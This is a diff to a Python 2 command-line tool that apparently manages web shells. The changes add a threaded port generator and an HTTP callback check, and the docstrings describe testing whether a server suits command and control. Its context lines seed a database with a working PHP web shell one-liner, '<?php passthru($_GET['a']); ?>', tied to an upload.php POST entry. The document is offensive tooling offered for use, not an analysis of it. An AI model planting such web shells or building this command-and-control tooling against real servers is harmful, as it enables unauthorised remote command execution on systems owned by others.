@@ -11,6 +11,7 @@ import random
 
 #variables related to threading
 database_lock = threading.Lock()#serialize access to the database
+generator_lock = threading.Lock()#serialize access to the generator
 
 port_condition = threading.Condition()#condition to tell the socket listener to prematurely exit or not
 
@@ -33,8 +34,20 @@ class threading_network_listener(threading.Thread):
 		listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#create a socket
 		listen_socket.bind(("", int(self.port)))#listens on any interface's ip address
 		listen_socket.listen(5)#actually listen to a port
-		print "socket bound to port ",self.port
+		print "network listener socket bound to port ",self.port
 		return listen_socket
+
+	def get_generated_socket_number(self):
+		"""
+			Handles the locking of the generator lock so the class can safely
+			grab a number from the generator
+		"""
+		global generator_lock
+		generator_lock.acquire()
+		global generator
+		self.port = generator.next()
+		generator_lock.release()
+
 	
 	def run(self):
 		"""
@@ -43,6 +56,7 @@ class threading_network_listener(threading.Thread):
 			If there is a transmission on this socket then this thread will add
 			the entry to the database
 		"""
+		self.get_generated_socket_number()
 		self.socket = self.create_socket()
 
 		#we only need to accept once in this scenario.
@@ -67,8 +81,7 @@ class threading_network_listener(threading.Thread):
 		sock.close()
 		self.socket.close()
 		print "closing socket"
-		##TODO: move over to a curses interface because this print
-		##statement is less than optimal
+		##TODO: move over to a curses interface 
 
 class threading_http_request(threading.Thread):
 	"""
@@ -85,11 +98,13 @@ class threading_http_request(threading.Thread):
 
 	def run(self):
 		"""
-			Handles making a request to the instance of this class's
-			url.
+			Handles making a request to the instance of this class's url.
 		"""
-		query_string = self.url + "?p=" + str(self.port) +"&i=" + self.ip + "&m=" + self.message
-		response = urllib2.urlopen(query_string)
+		try:
+			query_string = "http://" +self.url + "?p=" + str(self.port) +"&i=" + self.ip + "&m=" + self.message
+			response = urllib2.urlopen(query_string)
+		except ValueError:#something is wrong with the url
+			pass
 
 
 #global variables
@@ -98,6 +113,7 @@ prompt = "wsmi>"
 directory = ""
 current_shell_id = 0
 port_list = []
+generator = None
 
 def print_banner():
 	print "        _       __          __      _    __     __  __"
@@ -175,6 +191,7 @@ def initialize_database():
 			[("www.google.com"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
 		cursor.execute("create table open_ports(id integer, port_no integer, time text)")
 		conn.commit()
+
 	except sqlite3.OperationalError as e:
 		print str(e)
 
@@ -215,12 +232,15 @@ def manage_random_list():
 
 def run_candidate_threads(thread_count, timing):
 	"""
-		Runs and manages threads for 
+		Runs and manages threads for checking whether or not a server would be a good
+		command and control candidate.
 	"""
-	net_listen = threading_network_listener(65535)
+	
+	net_listen = threading_network_listener()
 	net_listen.start()
-	http_thread = threading_http_request("localhost",65535,"127.0.0.1","itch")
+	http_thread = threading_http_request("localhost",net_listen.port,"127.0.0.1","itch")
 	http_thread.start()
+
 	
 def check_candidacy():
 	"""
@@ -257,9 +277,13 @@ def keyboardHandler(signal, frame):
 
 def initialize():
 	"""Handles the initialization for the entire program"""
-	#creates a 
+	#creates a list of port numbers to check for candidacy of a specific web shell
+	#TODO move this over to a class because we are going to have to do this for 
+	#each webshell and this is inefficient at the moment.
 	for i in range(1025,65536):
 		port_list.append(i)
+	global generator
+	generator = manage_random_list()
 
 def main():
 	#initialization function
